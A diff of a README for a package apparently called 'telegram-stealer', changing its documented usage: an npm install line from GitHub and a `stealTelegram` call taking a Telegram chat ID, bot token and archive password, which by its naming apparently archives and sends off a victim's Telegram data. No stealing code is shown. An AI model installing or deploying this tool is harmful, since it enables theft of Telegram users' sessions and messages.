@@ -57,14 +57,9 @@ npm install https://github.com/rigwild/telegram-stealer.git
 ```ts
 import { run as stealTelegram } from 'telegram-stealer'
 
-type StealTelegram = (
-  telegramChatId: string,
-  telegramToken: string,
-  archivePassword?: string,
-  waitOnStart?: boolean
-) => Promise<void>
+type StealTelegram = (telegramChatId: string, telegramToken: string, archivePassword?: string) => Promise<void>
 
-await stealTelegram('<chat_id>', '<bot_token>', '<archivePassword>', false)
+await stealTelegram('<chat_id>', '<bot_token>', '<archivePassword>')
 ```
 
 ## Related projects
